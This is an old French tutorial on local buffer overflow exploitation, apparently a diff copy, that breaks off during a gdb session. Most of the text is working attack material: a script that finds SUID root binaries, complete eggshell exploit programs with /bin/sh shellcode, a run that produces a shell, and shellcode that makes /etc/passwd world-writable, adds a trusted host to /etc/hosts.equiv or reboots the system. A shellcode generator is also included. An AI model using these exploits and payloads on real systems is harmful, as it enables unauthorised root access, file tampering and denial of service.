@@ -1,0 +1,1882 @@
+                              BUFFER OVERFLOW By Lionel
+                              _________________________
+
+
+I)-Intro
+--------
+
+Pour comprendre ce texte, il faut s'y connaitre au minimum en C(voir asm)!
+J'ai fais ce texte , car il n'y a pas vraiment de bon article à ce sujet en
+francais.Ce texte n'est pas à un but de piratage mais pour "l'education"!
+Dans ce texte vous trouverez comment exploiter un buffer,comment reparer ces
+erreur de programmation, faire un shellcode ,quelques exemples.Exploiter un
+programme sa sert (dans la plupart des cas)à gagner un access root alors que
+normalement on a un access user simplement.
+
+II)-Quelles sont les programmes dangereux pouvant etre exploités?
+-----------------------------------------------------------------
+
+Je ne parlerais pas des possibilitées d'exploiter des programmes en
+remote.(remote=à distance) On va faire simple et parler que des programmes
+exploitables en local.Donc faut chercher des programmes qui a comme
+"propriétaire et nom de groupe du propriétaire" root (uid/gid):
+-rwsr-xr-x   1 root     root        12648 May  9  1998 /bin/su*
+
+Voici un petit script qui va faire se travail à votre place:
+---DBT---
+#!/bin/sh  
+ echo "OrganiKs Crew"
+ find /bin -user root -perm +a=s > suid.lst
+ find /sbin -user root -perm +a=s >> suid.lst
+ find /usr/bin -user root -perm +a=s >> suid.lst
+ find /etc -user root -perm +a=s >> suid.lst
+ find /var -user root -perm +a=s >> suid.lst
+ echo "see in suid.lst for the list..."
+---EOF---
+
+III)-Comment savoir si le programme à un trou de securité?
+-----------------------------------------------------------
+
+1-)Pour savoir si ton programme peut etre exploitable fais:
+[shell]$/bin/prog -option `perl -e 'print "A" x 2000'` 
+ou alors avec les sources du programme:
+[shell]$ grep 'strcpy\|strcat\|sprintf\|gets\|scanf' *.c 
+2-)Exemple:
+[shell]$cat > exemple.c
+main(int argc, char *argv[])
+{
+char buffer[1000];
+strcpy(buffer, argv[1]);
+}  
+[shell]$gcc -static exemple.c -o exemple
+[shell]$exemple `perl -e 'print "A" x 2000'`
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+        LC_ALL = (unset),
+        LANG = "fr"
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale ("C").
+Segmentation fault (core dumped) 
+[shell]$
+Quelques explications avant de continuer.
+1000 est la taile du buffer à faire debordé.
+On compile avec l'option -static pour pouvoir lire le prog avec gdb.
+Exemple `perl -e 'print "A" x 2000'` on fait sa pour voir si on peut faire
+debordé le buffer! Si cela est possible le programme plante:"Segmentation
+fault (core dumped)".Cela est normale vu que la taille du buffer est de
+1000caracteres max et nous nous y mettons 2000caracteres!
+Bon maintenent que l'on sais que on peut le faire debordé:
+[shell]$gcc -S exemple.c
+[shell]$more exemple.s
+	.file	"exemple.c"
+	.version	"01.01"
+/ GNU C version egcs-2.90.27 980315 (egcs-1.0.2 release) (i586-pc-linux-gnu) compiled by GNU C version 2.7.2.3.
+/ options passed: 
+/ options enabled:  -fpeephole -ffunction-cse -fkeep-static-consts
+/ -fpcc-struct-return -fcommon -fverbose-asm -fgnu-linker -fargument-alias
+/ -m80387 -mhard-float -mno-soft-float -mieee-fp -mfp-ret-in-387
+/ -mschedule-prologue -mcpu=pentium -march=pentium
+
+gcc2_compiled.:
+.text
+	.align 4
+.globl main
+	.type	 main,@function
+main:
+	pushl %ebp
+	movl %esp,%ebp
+	subl $1000,%esp
+	movl 12(%ebp),%eax
+	addl $4,%eax
+	movl (%eax),%edx
+	pushl %edx
+	leal -1000(%ebp),%eax
+	pushl %eax
+	call strcpy
+	addl $8,%esp
+.L1:
+	movl %ebp,%esp
+	popl %ebp
+	ret
+.Lfe1:
+	.size	 main,.Lfe1-main
+	.ident	"GCC: (GNU) egcs-2.90.27 980315 (egcs-1.0.2 release)"
+[shell]$
+On regarde ,subl $1000,%esp c'est la taille du buffer.
+Donc on note buff_size=1000
+[shell]$gdb exemple
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...  
+(gdb) break main
+Breakpoint 1 at 0x8048179
+(gdb) run
+Starting program: /home/Lionel/exemple
+
+Breakpoint 1, 0x8048179 in main ()
+(gdb) info registers
+eax            0x8059e70        134585968
+ecx            0xbffffc85       -1073742715
+edx            0x0      0
+ebx            0x8097fa0        134840224
+esp            0xbffff8e0       0xbffff8e0
+ebp            0xbffffcc8       0xbffffcc8
+esi            0x1      1
+edi            0x8097b80        134839168
+eip            0x8048179        0x8048179
+eflags         0x282    642
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x2b     43
+gs             0x2b     43
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y    
+[shell]$
+Donc la on recherche %ebp -> ebp            0xbffffcc8       0xbffffcc8
+0xcc8-4=0xcc4 en hex = 3268 en dec
+OFFSET=3268
+
+IV)-Config de notre exploit
+-----------------------------
+
+/*
+De plus, lorsque tu coderas un exploit en remote
+tu devras savoir que l'addr. de %esp est quasiment
+toujours la meme pour un OS donne.
+Ainsi, tu calculeras
+addr. ret = taille buffer + 2 * 4 ( sur x86)
+addr. ret = taille buffer + 2 * 8 ( sur sparc)
+[ Commentaires ajoutes par Mr_Ank <ank0u@usa.net> ]
+*/
+porgs:
+---DBT---
+/*
+FILE:   generic_egg_exploit.c 
+AUTH:   spyjure (spyjure@spyjurenet.com) 
+INFO:   generic eggshell program 
+USAGE:  compile: gcc generic_egg_exploit.c -o generic_egg_exploit 
+        ./generic_egg_exploit <target> [bsize] [offset] [eggsize] 
+*/
+#include <stdlib.h> 
+ 
+#define DEFAULT_OFFSET                 0 
+#define DEFAULT_BUFFER_SIZE            1021 
+#define DEFAULT_EGG_SIZE               4096 
+#define NOP                            0x90 
+ 
+char shellcode[] = 
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh"; 
+ 
+unsigned long get_sp(void) { 
+   __asm__("movl %esp,%eax"); 
+} 
+ 
+void main(int argc, char *argv[])  
+{ 
+  char *buff, *ptr, *egg; 
+  long *addr_ptr, addr; 
+  int bsize, offset, eggsize; 
+  int i; 
+  int shell_len = strlen(shellcode); 
+ 
+  char *target; 
+  char *args[3]; 
+  char *env[2]; 
+  
+  if(argc > 1) target = argv[1]; 
+  else 
+  { 
+    printf("Usage: %s target [bsize] [offset] [eggsize]\n"); 
+    exit(-1); 
+  } 
+ 
+  bsize = (argc > 2) ? atoi(argv[2]) : DEFAULT_BUFFER_SIZE; 
+  offset = (argc > 3) ? atoi(argv[3]) /*+ strlen(argv[1])*/ : DEFAULT_OFFSET; 
+  eggsize = (argc > 4) ? atoi(argv[4]) : DEFAULT_EGG_SIZE; 
+ 
+  if (!(buff = malloc(bsize)))  
+  { 
+    printf("Can't allocate memory.\n"); 
+    exit(0); 
+  } 
+ 
+  if (!(egg = malloc(eggsize)))  
+  { 
+    printf("Can't allocate memory.\n"); 
+    exit(0); 
+  } 
+ 
+   for(i = 0; i < eggsize; i++) egg[i] = NOP; 
+   ptr = egg + (eggsize) - (shell_len) - 1; 
+   for(i = 0; i < shell_len; i++) *(ptr++) = shellcode[i]; 
+   egg[eggsize - 1] = '\0'; 
+ 
+   memcpy(egg, "EGG=", 4); 
+   putenv(egg); 
+  
+   addr = get_sp() - offset; 
+  
+   ptr = buff;  
+   addr_ptr = (long *) ptr; 
+   for(i = 0; i < bsize; i+=4) 
+       *(addr_ptr++) = addr; 
+   buff[bsize - 1] = '\0'; 
+ 
+   printf("sp=%lx addr=%lx env=%lx\n", get_sp() - offset, addr, getenv("EGG")); 
+ 
+   memcpy(buff,"RET=",4); 
+   putenv(buff); 
+ 
+   args[0] = argv[1]; /*"/usr/sbin/traceroute";*/ 
+---EOF---
+Le code ci dessous est fait pour get_offset...
+---DBT---
+/******************************************************************************
+FILE:	gee_multiparam.c
+AUTH:	spyjure (spyjure@spyjurenet.com)
+INFO:	Generic Eggshell Exploit capable of handling multiple
+	parameters for the target application.
+USAGE:	compile: gcc gee_multiparam.c -o gee_multiparam
+	
+	./gee_multiparam <target> [bsize] [offset] [eggsize] [extraparameters]
+	
+	The extra parameters must be at the end of the line, and if
+	applicable, the parameter to be overflowed must be the last
+	parameter in the list.
+	
+	Example:
+	./gee_multiparam msgchk 1025 0 4096 -host
+	
+	This will overflow the -host parameter and (hopefully) give you root.
+
+THANKS:	Aleph One for his tutorial on buffer overflows. 
+	
+Check out http://spyjurenet.com for more security information!
+*******************************************************************************/
+
+#include <stdlib.h>
+
+#define DEBUG  /* To get debug info (golly! :) */
+
+#define DEFAULT_OFFSET                 0
+#define DEFAULT_BUFFER_SIZE            1021
+#define DEFAULT_EGG_SIZE               4096
+#define NOP                            0x90
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) 
+{
+   __asm__("movl %esp,%eax");
+}
+
+void main(int argc, char *argv[]) 
+{
+   char *buff, *ptr, *egg;
+   long *addr_ptr, addr;
+   int bsize, offset, eggsize;
+   int i, j;
+   int shell_len = strlen(shellcode);
+
+   char **args; 
+   char *env[2];
+ 
+   if(argc < 2)
+   {
+      printf("Usage: %s target [bsize] [offset] [eggsize]\n", argv[0]);
+      exit(-1);
+   }
+
+   bsize = (argc > 2) ? atoi(argv[2]) : DEFAULT_BUFFER_SIZE;
+   offset = (argc > 3) ? atoi(argv[3]) : DEFAULT_OFFSET;
+   eggsize = (argc > 4) ? atoi(argv[4]) : DEFAULT_EGG_SIZE;
+
+   if(!(buff = malloc(bsize))) 
+   {
+      printf("Can't allocate memory.\n");
+      exit(-1);
+    }
+  
+   if(!(egg = malloc(eggsize))) 
+   {
+      printf("Can't allocate memory.\n");
+      exit(-1);
+    }
+
+    /* Create the egg.  To do this, we create a buffer eggsize in length filled
+     * with NOPs.  Then we put our shell code at the very end of it and be sure
+     * to NULL terminate it.  The NULL isn't for our shell to work; it's for
+     * the putenv to work properly.
+     */
+
+    for(i = 0; i < eggsize; i++) egg[i] = NOP;
+    ptr = egg + eggsize - shell_len - 1;
+    for(i = 0; i < shell_len; i++) *ptr++ = shellcode[i];
+    egg[eggsize - 1] = '\0';
+
+    /* Create the parameter overflow.  We create a parameter for our target
+     * program which overflows a buffer inside the target.  The value of this
+     * parameter is simply a repeat of the same number over and over.  The
+     * number we are repeating is a pointer to the egg we created above.  When
+     * the target program overflows its buffer and tries to return from the
+     * function, it gets its return value from this buffer, which points to the
+     * eggshell above, executing our command and giving us a shell!
+     */
+
+    addr = get_sp() - offset;		/* our return address */
+ 
+    ptr = buff; 
+    addr_ptr = (long *)ptr;
+    for(i = 0; i < bsize; i+=4)		/* Fill the buffer with the address */
+       *addr_ptr++ = addr;
+    buff[bsize - 1] = '\0';		/* NULL terminate everything, stupid. */
+
+#ifdef DEBUG
+    /* Just some nice debug info, if you're interested. */
+    printf("sp=%lx addr=%lx\n", get_sp() - offset, addr);
+#endif
+
+   /* Construct the command line for our target program.  If the user supplied
+    * additional parameters for the target, add them into our list.
+    */
+
+   j = 0;
+
+   /* Allocate space for the parameters.  If we have extra parameters, they
+    * will be the ones after space 5 on our command line.  In addition, we
+    * always need 3 -- the target program, our overflow parameter, and NULL. 
+    */
+
+   args = (char**)malloc(sizeof(char*) * ((argc > 5) ? argc - 5 + 3 : 3));
+
+   args[j++] = argv[1];   /* The name of the target goes first */
+ 
+   /* Now add additional parameters */ 
+   if(argc > 5)
+   {
+      for(i = 5; i < argc; i++)
+      {
+         args[j++] = argv[i];
+      }
+   } 
+
+   args[j++] = buff;     /* Our commandline overflow */
+   args[j] = NULL;       /* NULL terminate the list  */
+
+   /* If the target program needs more environmental variables, 
+    * add them here.  (If you need help, email spyjure@spyjurenet.com.)
+    */
+
+   env[0] = egg;
+   env[1] = NULL;
+
+#ifdef DEBUG
+   printf("Command line:\n");
+   for(i = 0; i < j; i++)
+   {
+      printf("%s ", args[i]);
+   }
+   printf("\n\n");
+#endif
+
+   execve(args[0], args, env);
+}
+---EOF---
+
+---DBT---
+/*
+FILE:   get_offset.c 
+AUTH:   spyjure (spyjure@spyjurenet.com) 
+*/
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+   void (*shell)(); /* = getenv("EGG"); */
+  
+   shell = (argc > 1) ? *((long*)argv[1]) : getenv("EGG");
+ 
+   printf("EGG=%lx SHELL=%lx\n", getenv("EGG"), shell);
+   printf("OFFSET=%d\n", (long)shell - (long)getenv("EGG")
+            /*- strlen(argv[0])*/); 
+
+   {  printf("Attempting to run shell code...\n");
+      (*shell)();
+   }
+}
+---EOF---
+EGG=4096
+BUFFER=1000+16=1016
+OFFSET=3272
+[shell]$./generic_egg_exploit get_offset buffer offset egg
+donc
+[Lionel@localhost overflow_exploits]$ ./generic_egg_exploit get_offset 1016
+3268 4096 
+sp=bfffef28 addr=bfffef30 env=804ae94
+EGG=bfffeff5 SHELL=bfffef30
+OFFSET=-197
+Attempting to run shell code...
+Illegal Instruction (core dumped) 
+[shell]$
+OFFSET=-197
+[shell]$ ./generic_egg_exploit exemple 1016 -201 4096
+sp=bffffcb1 addr=bffffcb9 env=804ae94     
+bash$ 
+
+V)-Shellcode
+------------
+Un shellcode c'est une commande en asm en faite un shellcode ca veus dire rien
+de plus que code shell(code qui run un shell).Sauf que au lieu de faire un
+prog en c qui run un shell on va le mettre en asembleur.Un shellcode ne sert
+pas que pour les codes d'exploit pour les buffer overflows , il peuve servire
+a plein d'autre chose.Je conte faire un autre article a ce sujet...
+Comme je dis toujours faut pas se faire "chier" dans la vie.  
+Voici quelques shellcodes et un generateur de shellcode:
+
+shellcode:
+---DBT---
+/* 
+[ http://www.rootshell.com/ ]
+asmcodes.txt
+*/
+/* This one changes the mode on /etc/passwd to 777 */
+char shellcode[]=
+  "\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff\x31\xdb\xb3\x1d"
+  "\x01\xfb\x30\xc0\x88\x43\x0b\x31\xc9\x66\xb9\xff\x01\x31\xc0\xb0"
+  "\x0f\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x2f\x65\x74\x63\x2f\x70\x61"
+  "\x73\x73\x77\x64\x89\xec\x5d\xc3";
+
+/* This one creates /etc/hosts.equiv with a host called b00ger */
+char shellcode[]=
+  "\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff\x31\xdb\xb3\x35"
+  "\x01\xfb\x31\xc0\x88\x43\x10\x31\xc9\x66\xb9\x41\x04\x31\xd2\x66\xba"
+  "\xa4\x01\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x31\xc9\xb1\x46\x01\xf9\x31" 
+  "\xd2\xb2\x07\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x2f\x65"
+  "\x74\x63\x2f\x68\x6f\x73\x74\x73\x2e\x65\x71\x75\x69\x76\x01\x62\x30"
+  "\x30\x67\x65\x72\x0a\x89\xec\x5d\xc3";
+
+/* This one is useless: it just changes the hostname to yEw_r_0wn3d */
+char shellcode[]=
+   "\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff"
+   "\x31\xc0\xb0\x4a\x31\xdb\xb3\x16\x01\xfb\x31\xc9\xb1"
+   "\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x79\x45\x77\x5f"
+   "\x72\x5f\x30\x77\x6e\x33\x64\x89\xec\x5d\xc3";
+
+/* This is also useless: it just reboots an x86 machine */
+char shellcode[]=
+   "\xeb\x03\x5f\xeb\x05\xe8\xf8\xff"
+   "\xff\xff\x31\xc0\xb0\x24\xcd\x80\x31\xc0\xb0"
+   "\x58\xbb\xad\xde\xe1\xfe\xb9\x69\x19\x12\x28"
+   "\xba\x67\x45\x23\x01\xcd\x80\x31\xc0\xb0\x01"
+   "\xcd\x80\x89\xec\x5d\xc3";
+
+ -- Source code --
+   # changes mode on /etc/passwd to 777 
+   # making it writeable by anyone. 
+   jmp rootshell
+   hey:
+      popl %edi
+      jmp yo
+   rootshell:
+      call hey
+   yo: 				# yo! w3rD!
+		                # chmod() is system call 15 (0xf)
+				# (see /usr/include/asm/unistd.h)
+				# eax contains syscall number 
+      xorl %ebx,%ebx            # ebx has path to file
+      movb $(phile-yo),%bl
+      addl %edi,%ebx            
+      xorb %al,%al 	        # clear out al
+      movb %al,11(%ebx)         # length of filename (11)
+      xorl %ecx,%ecx            # clear out ecx
+      movw $00777,%cx           # ecx contains mode 777
+      xorl %eax,%eax            # clear out eax
+      movb $0xf,%al             # syscall 15 (0xf) is chown
+      int $0x80                 # interrupt (make call)
+      xorl %eax,%eax            # clear eax
+      movb $0x01,%al            # syscall 1 (0x01) is exit
+      int $0x80                 # interrupt (make call)
+   phile:
+   .ascii \"/etc/passwd\"       # /etc/passwd (11)
+
+-------------------------
+   # Creates the file /etc/hosts.equiv if it does
+   # not exist (or appends to if it does) and will
+   # insert the host:   b00ger
+   # changing this should be trivial
+   jmp rootshell		 
+   coded_by_bmV:                
+      popl %edi
+   jmp phoo
+   rootshell:
+      call coded_by_bmV
+   phoo: 			# ok. I meant 'foo'
+                                # open() is system call 5 
+                                # (see /usr/include/asm/unistd.h)
+                                # eax contains syscall number
+				# ebx will have filename
+				# ecx contains open flags
+				# edx contains mode of file
+				# ->file is handle returned to eax
+      xorl %ebx,%ebx 	        # clear ebx
+      movb $(file-phoo),%bl     # filename to open in ebx
+      addl %edi,%ebx
+      xorl %al, %al	        # clear out al
+      movb %al,16(%ebx)         # /etc/hosts.equiv (16)
+      xorl %ecx,%ecx            # clear out ecx
+      movw $0x441,%cx           # O_WRONLY | O_CREAT | O_APPEND
+      xorl %edx,%edx	        # clear out edx
+      movw $00644,%dx	 	# mode 0644 -rw-r--r--
+      xorl %eax,%eax		# clear eax
+      movb $0x5,%al 		# syscall 5 (0x5) is open()
+      int $0x80			# interrupt (make call)
+				# write() is system call 4
+				# (see /usr/include/asm/unistd.h)
+				# eax contains syscall 4 (write)
+				# ebx will have file handle
+			  	# ecx will point to "b00ger"
+			        # edx is strlen("b00ger");
+      movl %eax,%ebx		# move file handle to ebx
+      xorl %ecx, %ecx           # clear out ecx
+      movb $(string-phoo),%cl   # put "b00ger" in ecx
+      addl %edi,%ecx
+      xorl %edx,%edx	        # clear edx
+      movb $7,%dl		# strlen("b00ger") ==7
+      xorl %eax,%eax		# clear out eax
+      movb $0x04,%al		# syscall 4 is write()
+      int $0x80			# interrupt (make call)
+      xorl %eax,%eax		# clean out eax
+      movb $0x01,%al		# syscall 1 (0x01) is exit()
+      int $0x80			# interrupt (make call)
+				# exit() should close file
+   file:
+   .ascii \"/etc/hosts.equiv\"	
+   .byte 1
+   string:
+   .ascii \"b00ger\n\"
+
+-------------------------
+   # written just for grins ;-)
+   # code to change to hostname of the
+   # target machine to: yEw_r_0wn3d 
+   # Yes, I know this is useless :P
+  jmp rootshell
+  by_bm5:
+     popl %edi
+     jmp asmcode
+  rootshell:
+     call by_bm5
+  asmcode: 			   # assembly code ?
+				   # 74 (0x4a) is sethostname()
+			           # (see /usr/include/asm/unistd.h)
+				   # eax will have syscall 74
+				   # ebx points to "yEw_r_0wn3d"
+			           # ecx= strlen("yEw_r_0wn3d")==11
+     xorl %eax,%eax		   # clear out eax
+     movb $0x4a,%al		   # move 74 (sethostname()) to al
+     xorl %ebx,%ebx		   # clear out ebx
+     movb $(string-asmcode),%bl    # put yEw_r_0wn3d in ebx
+     addl %edi,%ebx
+     xorl %ecx,%ecx		   # clear out ecx
+     movb $0x0b,%cl	           # strlen("yEw_r_0wn3d")==0xb
+     int $0x80		           # interrupt (make call)
+     xorl %eax,%eax		   # clear out eax
+     movb $0x01,%al                # syscall 1 (0x01) is exit()
+     int $0x80			   # interrupt (make call)
+  .byte
+  string:
+  .ascii \"yEw_r_0wn3d\"
+
+-------------------------
+  # reboots a Linux x86 box 
+  # also quite useless, but 
+  # good for learning.
+  jmp rootshell	
+  coded_by_bmV:
+     popl %edi
+     jmp reb00t
+  rootshell:
+     call coded_by_bmV
+  reb00t: 			# reboot Linux
+				# sync() is syscall 36
+				# (see /usr/include/asm/unistd.h)
+     xorl %eax,%eax		# clear out eax
+     movb $0x24,%eax		# make syscall to sync()
+     int $0x80			# interrupt (make call)
+				# reboot() is syscall 88 (0x58)
+				# (see /usr/include/asm/unistd.h)
+				# eax contains syscall 88 (reboot)
+				# ebx will contain magic
+				# ecx will contain magic2
+			        # (see manual page for reboot)
+     xorl %eax,%eax		# clear out eax
+     movb $0x58,%eax 		# move 88 (reboot()) to eax
+     movl $0xfee1dead,%ebx	# put magic into ebx
+     movl $672274793,%ecx	# put magic2 into ecx
+     movl $0x1234567,%edx 	# put flag into edx
+				# read reboot manpage!
+     int $0x80			# interrupt (make call)
+     xorl %eax,%eax		# clear out eax
+     movb $0x01,%al		# syscall 1 (0x01) is exit()
+     int $0x80			# interrupt (make call)
+
+-------------------------
+---EOF---
+
+generateur de shellcode:
+---DBT---
+/*
+ *
+ * shellcode 1 - (Nov 25, 1998)
+ *
+ * this proggie generates a binary execve code for any commands 
+ * with any arguments. it shows the asm and hex  code of execve 
+ * wanted. both outputs asm and hex code can be executed on the 
+ * stack. for example, you can use it when you want to  exploit
+ * a buffer overrun situation on linux.
+ * 
+ * any comments and sugestions to jamez@sekure.org
+ *
+ *
+ * thanks for all people from sekure sdi(www.sekure.org)
+ *
+ *
+ */
+#include <stdio.h>
+#define MAX_PARAM 100
+int hexcode[4086];                 /* hex code for exeve */
+int hexsize = 0;                   /* size of hex code */
+char asmcode[4096];                /* asm code for exeve */
+char aux[1024];                    /* aux string */
+char params[1024];                 /* parameters including program name */  
+void asmcat(char * s) {
+  strcat(asmcode, s);
+}
+void addasm(char * fmt, int addr) {
+  sprintf(aux, fmt, addr);
+  strcat(asmcode, aux);
+}
+void addhex(int hex) {
+  hexcode[hexsize] = hex;
+  hexsize++;
+}
+void printhex() {
+  int i;
+  char s[10];
+  printf("\n-----------------( hex code )--\n\n");
+  printf("char shellcode[] = \n");
+  printf("\t\"");
+  for(i = 0; i < hexsize; i++) {
+    if((i - i/12 * 12) == 0 && i != 0) {
+      printf("\"\n");
+      printf("\t\"");
+    }
+    if(hexcode[i] < 16 && hexcode[i] >= 0)
+      printf("\\x0%x", hexcode[i]);
+    else 
+      if(hexcode[i] > 0) 
+	printf("\\x%x", hexcode[i]);
+      else  {
+	sprintf(s, "%x", hexcode[i]);
+	printf("\\x%c", s[6]);
+	printf("%c", s[7]);
+      }
+  }
+  printf("%s\"\n", params);
+}
+int main(int argc, char * argv[]) {
+  int i,                             /* some for's */
+    jmp,                             /* how many bytes to jmp to get call instruction */
+    num_params,                      /* how many parameters */
+    size = 0;                        /* size of the whole command */
+  int nulls[MAX_PARAM];              /* where the null bytes go */
+  if(argc == 1) {
+    printf("\nshellcode, first version. (Nov 25, 1998)\n\n");
+    printf("  this proggie generates a binary execve code for any commands\n");;
+    printf("  with any arguments. it shows the asm and hex  code of execve\n"); 
+    printf("  wanted. both outputs asm and hex code can be executed on the\n");
+    printf("  stack. for example, you can use it when you want to exploit\n");
+    printf("  a buffer overrun situation on linux.\n\n");
+    printf("  it's a jamez product. jamez@sekure.org\n");
+    printf("  sekure sdi - www.sekure.org\n\n");
+    printf(" - usage: %s path+program [first arg] [second arg] ...\n\n", argv[0]);
+    exit(0);
+  }
+  num_params = argc - 1;
+  /* parse out the parameters */
+  params[0] = '\0';
+  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {    
+    size += strlen(argv[i+1]) + 1;    /* plus one to the null end */   
+    strcat(params, argv[i + 1]);
+    nulls[i] = strlen(params);    
+    strcat(params, "\x20");      
+  }
+  params[size-1] = '\0';   
+  /* create the asm code */
+  hexcode[0] = '\0';
+  asmcode[0] = '\0';
+  jmp = 22 + 3 + (num_params-1)*6 + 3*num_params + 3;
+  addhex(0xeb);
+  addhex(jmp);
+  addasm("\tjmp   0x%x\n", jmp);
+  addhex(0x5e);
+  asmcat("\tpopl  %esi\n");         /* popl  %esi */
+  /* fill char * array w/ addr's */
+  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {    
+    if(i == 0) {
+      addasm("\tmovl  %%esi,0x%x(%%esi)\n", size);
+      addhex(0x89);
+      addhex(0x76);
+      addhex(size);
+    }
+    else {
+      addhex(0x8d);
+      addhex(0x5e);
+      addhex(nulls[i-1]+1);
+      addasm("\tleal  0x%x(%%esi),%%ebx\n", nulls[i-1]+1);
+      addhex(0x89);
+      addhex(0x5e);
+      addhex(size + i*4);
+      addasm("\tmovl  %%ebx,0x%x(%%esi)\n", size + i*4);
+    }
+  }  
+  addhex(0x31);
+  addhex(0xc0);
+  asmcat("\txorl  %eax,%eax\n");
+  /* put null at the of strings */
+  for(i = 0; i <  num_params && i < MAX_PARAM; i++) {    
+    addhex(0x88);
+    addhex(0x46);
+    addhex(nulls[i]);
+    addasm("\tmovb  %%eax,0x%x(%%esi)\n", nulls[i]);       
+  }  
+  addhex(0x89);
+  addhex(0x46);
+  addhex(size + 4*num_params);  
+  addasm("\tmovl  %%eax,0x%x(%%esi)\n", size + 4*num_params);
+  addhex(0xb0);
+  addhex(0x0b);  
+  asmcat("\tmovb  $0xb,%al\n"); 
+  addhex(0x89);
+  addhex(0xf3);  
+  asmcat("\tmovl  %esi,%ebx\n");
+  addhex(0x8d);
+  addhex(0x4e);  
+  addhex(size);
+  addasm("\tleal  0x%x(%%esi),%%ecx\n", size);  
+  addhex(0x8d);  
+  addhex(0x56);  
+  addhex(size + 4*num_params);  
+  addasm("\tleal  0x%x(%%esi),%%edx\n", size + 4*num_params);
+  addhex(0xcd);  
+  addhex(0x80);
+  asmcat("\tint   $0x80\n");
+  addhex(0x31);  
+  addhex(0xdb);
+  asmcat("\txorl  %ebx,%ebx\n");
+  addhex(0x89);  
+  addhex(0xd8);
+  asmcat("\tmovl  %ebx,%eax\n");
+  addhex(0x40);  
+  asmcat("\tinc   %eax\n");
+  addhex(0xcd);
+  addhex(0x80);
+  asmcat("\tint   $0x80\n");
+  addhex(0xe8);
+  addhex((jmp+5) * -1);
+  addhex(0xff);
+  addhex(0xff);
+  addhex(0xff);
+  addasm("\tcall  -0x%x\n", jmp+5);
+  asmcat("\t.string \\\"");
+  asmcat(params);
+  asmcat("\\\"");
+  printf("\n-----------------( asm code )--\n\n");
+  printf("int main() {\n");
+  printf("\t__asm__(\"\n");
+  printf("%s\");\n", asmcode);
+  printf("}\n");
+  printhex();
+  printf("\n\n(by jamez for your profit)\n\n");
+}
+---EOF---
+
+Bon je vais essayé de vous expliquez comment faire un shellcode , vue que mes
+connaissance en la matiere ne sont pas tres etendu vous me pardonerez pour mes
+fautes:
+
+1) les fichiers Source ( *.S )
+------------------------------
+En se moment je vous pas mal de shellcode qui sont en format source et donc il
+faut vous demerdez vous meme pour les mettrent dans un format lisible pour
+votre exploit...
+Le plus souvent sous un format *.S (ex: ps.S).Je vais vous
+expliquer comment faire pour obternir un shellcode style "/x80/x80/x80" ,en
+faite c'est tres simple: 
+-il suffi de faire cette commande sur un shell:"as -a
+-o fichier.o fichier.S > fichier.asm" 
+Puis apres avoir fait cela vous ouvrez fichier.asm: 
+/* fichier.asm */
+
+GAS LISTING fichier.S 			page 1
+
+
+   1              	.globl main
+   2              	main:
+   3 0000 31DB     	xorl %ebx,%ebx /* zero the %ebx register, i.e. the 1st argument */
+   4 0002 89D8     	movl %ebx,%eax /* zero out the %eax register */
+   5 0004 B017     	movb $0x17,%al /* set the syscall number */
+   6 0006 CD80     	int $0x80 /* call the interrupt handler */
+ GAS LISTING fichier.S 			page 2
+
+
+DEFINED SYMBOLS
+               fichier.S:2      .text:00000000 main
+
+NO UNDEFINED SYMBOLS
+/* fin */
+Maintenant nous allons garder juste la 3eme colone qui nous interesse:
+31DB 
+89D8 
+B017
+CD80
+Donc maintenant que l'on a ces caracteres hex on va les mettre en format
+lisible:
+char fichiercode[]=
+  "\x31\xDB\x89\xD8\xB0\x17\xCD\x80";
+Comme vous pouvez le voir on prend les caracteres hex 2 par 2 "x31" qui reviens
+a "0x31" et on les mets a la suite comme ci dessus "\x31\xDB\..\x80".
+Jusqu'a la c'est simple apres nous voulons verifié notre shellcode fini donc
+on va le mettre dans un "concepte" en "c":
+/* fichier.c */
+char shellcode[]=
+  "\x31\xDB\x89\xD8\xB0\x17\xCD\x80";
+void main()
+{
+  int *ret;
+  printf("OrganiKs Crew\n");
+  ret = (int *)&ret + 2;
+  (*ret) = (int)shellcode;
+}
+/* fichier.c */
+
+
+Ce code est un code pour exploit de wu-ftp par exemple(il sert a reprendre le
+root privilege "setuid").
+
+2)Pour s'aider pour le porchain chapritre:
+------------------------------------------
+La ca deviens chaud :)
+Mieux vaut connaitre les bases de l'asm (moi meme j'ai du lire quelques docs
+avant de comprendre)
+. 
+En premier il faut ecrire un code en c:
+#include <stdio.h>
+void main() {
+   char *name[2];
+
+   name[0] = "/bin/sh";
+   name[1] = NULL;
+   execve(name[0], name, NULL);
+}                 
+puis tu le compile en static:
+[Lionel@OrganiKs]$ gcc -static -o shell shell.c
+[Lionel@OrganiKs]$ gdb shell
+GNU gdb 4.17
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
